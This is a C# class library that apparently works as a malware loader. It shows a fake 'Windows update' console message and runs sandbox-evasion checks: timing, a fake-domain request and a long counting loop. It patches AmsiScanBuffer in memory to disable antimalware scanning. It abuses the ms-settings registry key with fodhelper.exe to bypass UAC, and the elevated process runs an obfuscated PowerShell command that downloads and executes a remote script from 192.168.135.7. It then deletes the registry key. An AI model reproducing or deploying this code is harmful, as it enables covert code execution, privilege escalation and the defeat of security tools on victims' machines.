using System;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using Microsoft.Win32;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
        [DllImport("kernel32", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
        public static void runner()
        {
            Console.WriteLine("Windows update download complete. Preparing to configure Windows. Do not turn off your computer.");
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            //antiheur: contact fake url and see if status actually returned ok
            string url = "http://woltramaplha.com";
            //string url = "https://google.com"; //test
            // Creates an HttpWebRequest for the specified URL.
            try
            {
                HttpWebRequest myHttpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                // Sends the HttpWebRequest and waits for a response.
                HttpWebResponse myHttpWebResponse = (HttpWebResponse)myHttpWebRequest.GetResponse();
                if (myHttpWebResponse.StatusCode == HttpStatusCode.OK)
                {
                    return;
                }
                // Releases the resources of the response.
                myHttpWebResponse.Close();
            }
            catch
            {
                Console.WriteLine("Configuring Windows update... Do not turn off your computer.");
            }

            //antiheur: loop 900 million times and see if the loop really happened
            int count = 0;
            int max = 900000000;
            for (int i = 0; i < max; i++)
            {
                count++;
            }
            if (count != max)
            {
                return;
            }
            gogo();
        }

        static void gogo()
        {
            //wreck amsi
            string name1 = "a" + "msi" + ".dll";
            string name2 = "A" + "msi" + "ScanB" + "uffer";
            IntPtr TargetDLL = LoadLibrary(name1);
            IntPtr MimiPtr = GetProcAddress(TargetDLL, name2);
            UInt32 oldProtect = 0;
            Byte[] bufi = { 0x48, 0x31, 0xC0 };
            VirtualProtect(MimiPtr, 3, 0x40, out oldProtect);
            Marshal.Copy(bufi, 0, MimiPtr, bufi.Length);
            VirtualProtect(MimiPtr, 3, 0x20, out oldProtect);

            //rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
			byte[] data = Convert.FromBase64String("cnVuZGxsMzIgU0hFTEwzMi5ETEwsU2hlbGxFeGVjX1J1bkRMTCAiY21kIiAiL2MgcF5vXndeZV5yc15oXmVebGwuZXhlIGlleChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRTdHJpbmcoW2NoYXJbXV1AKDM2LCAxMTksIDk5LCAzMiwgNjEsIDMyLCA0MCwgMTEwLCAxMDEsIDExOSwgNDUsIDExMSwgOTgsIDEwNiwgMTAxLCA5OSwgMTE2LCAzMiwgMTE1LCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDExMCwgMTAxLCAxMTYsIDQ2LCAxMTksIDEwMSwgOTgsIDk5LCAxMDgsIDEwNSwgMTAxLCAxMTAsIDExNiwgNDEsIDU5LCAzNiwgMTE5LCA5OSwgNDYsIDEwNCwgMTAxLCA5NywgMTAwLCAxMDEsIDExNCwgMTE1LCA0NiwgOTcsIDEwMCwgMTAwLCA0MCwgMzksIDg1LCAxMTUsIDEwMSwgMTE0LCA0NSwgNjUsIDEwMywgMTAxLCAxMTAsIDExNiwgMzksIDQ0LCAzOSwgNzcsIDExMSwgMTIyLCAxMDUsIDEwOCwgMTA4LCA5NywgNDcsIDUzLCA0NiwgNDgsIDMyLCA0MCwgODcsIDEwNSwgMTEwLCAxMDAsIDExMSwgMTE5LCAxMTUsIDMyLCA3OCwgODQsIDMyLCA0OSwgNDgsIDQ2LCA0OCwgNTksIDMyLCA4NCwgMTE0LCAxMDUsIDEwMCwgMTAxLCAxMTAsIDExNiwgNDcsIDU1LCA0NiwgNDgsIDU5LCAzMiwgMTE0LCAxMTgsIDU4LCA0OSwgNDksIDQ2LCA0OCwgNDEsIDMyLCAxMDgsIDEwNSwgMTA3LCAxMDEsIDMyLCA3MSwgMTAxLCA5OSwgMTA3LCAxMTEsIDM5LCA0MSwgNTksIDEwNSwgMTAxLCAxMjAsIDQwLCAzNiwgMTE5LCA5OSwgNDYsIDEwMCwgMTExLCAxMTksIDExMCwgMTA4LCAxMTEsIDk3LCAxMDAsIDExNSwgMTE2LCAxMTQsIDEwNSwgMTEwLCAxMDMsIDQwLCAzOSwgMTA0LCAxMTYsIDExNiwgMTEyLCA1OCwgNDcsIDQ3LCA0OSwgNTcsIDUwLCA0NiwgNDksIDU0LCA1NiwgNDYsIDQ5LCA1MSwgNTMsIDQ2LCA1NSwgNDcsIDExNCwgMTE3LCAxMTAsIDQ2LCAxMTYsIDEyMCwgMTE2LCAzOSwgNDEsIDQxKSkpIg==");
            string command = Encoding.UTF8.GetString(data);

            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"ms-settings\Shell\Open\command");

            RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
            fod.SetValue("DelegateExecute", "");
            fod.SetValue("", @command);
            fod.Close();

            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
            p.Start();

            Thread.Sleep(10000);

            newkey.DeleteSubKeyTree("ms-settings");
            return;
            //MessageBox(IntPtr.Zero, command.ToString(), "This is my caption", 0);
        }
    }
}